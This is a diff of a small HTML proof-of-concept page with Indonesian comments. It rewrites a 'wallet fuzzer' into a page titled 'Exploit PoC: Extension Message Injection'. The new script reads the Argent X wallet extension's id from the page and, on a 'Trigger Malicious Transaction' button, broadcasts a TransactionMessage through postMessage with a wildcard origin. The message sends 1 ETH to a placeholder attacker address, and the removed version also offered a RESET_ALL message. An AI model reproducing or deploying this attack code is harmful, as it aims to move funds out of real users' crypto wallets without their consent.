@@ -1,60 +1,35 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Advanced Wallet Fuzzer</title>
+    <title>Exploit PoC: Extension Message Injection</title>
 </head>
 <body>
-    <h1>Security Test: Transaction Fuzzer</h1>
-    
-    <div>
-        <label>Pilih Tipe:</label>
-        <select id="msgType">
-            <option value="RESET_ALL">RESET_ALL</option>
-            <option value="TransactionMessage">TransactionMessage</option>
-            <option value="AccountMessage">AccountMessage</option>
-        </select>
-    </div>
-
-    <div style="margin-top: 10px;">
-        <label>Payload (JSON):</label><br>
-        <textarea id="payloadData" rows="5" style="width: 100%;">
-{
-  "to": "0xTargetAddress...",
-  "amount": "0.01",
-  "data": "0x"
-}
-        </textarea>
-    </div>
-
-    <button id="sendBtn" style="padding: 15px; margin-top: 10px; background: red; color: white;">Kirim Payload Eksploit</button>
-    <pre id="log" style="background: #eee; padding: 10px; margin-top: 10px;"></pre>
+    <h1>Security Test Interface</h1>
+    <button id="trigger">Trigger Malicious Transaction</button>
 
     <script>
-        const log = (msg) => document.getElementById('log').innerText += msg + '\n';
+        // Skenario Nyata: Mengambil ID ekstensi dari atribut yang terekspos di DOM
+        // Jika tidak muncul, Anda harus melakukan inspeksi manual di chrome://extensions
+        const targetId = document.getElementById("argent-x-extension")?.getAttribute("data-extension-id");
 
-        document.getElementById('sendBtn').addEventListener('click', () => {
-            const type = document.getElementById('msgType').value;
-            let customData = {};
-            
-            try {
-                customData = JSON.parse(document.getElementById('payloadData').value);
-            } catch (e) {
-                log("Error: Format JSON salah!");
-                return;
-            }
-
-            const extId = document.getElementById("argent-x-extension")?.getAttribute("data-extension-id") || "unknown";
-            
+        document.getElementById('trigger').addEventListener('click', () => {
+            // Payload mengacu pada MessageType dari 1000163978.png
             const payload = {
-                type: type,
-                extensionId: extId,
-                ...customData // Menyertakan data transaksi/akun
+                type: "TransactionMessage", // Target tipe pesan spesifik
+                extensionId: targetId,
+                params: {
+                    to: "0xYourControlledAddressHere", // Alamat penyerang
+                    amount: "1000000000000000000", // 1 ETH dalam Wei
+                    data: "0x"
+                },
+                timestamp: Date.now()
             };
 
-            log("Mengirim: " + JSON.stringify(payload));
+            // Mengirim ke target origin spesifik atau wildcard untuk mendeteksi leak
+            // Skenario nyata: Menggunakan postMessage untuk memintas boundary ekstensi
             window.postMessage(payload, "*"); 
-            log("Pesan dikirim.");
+            
+            console.log("Payload dikirim ke ekstensi:", payload);
         });
     </script>
 </body>
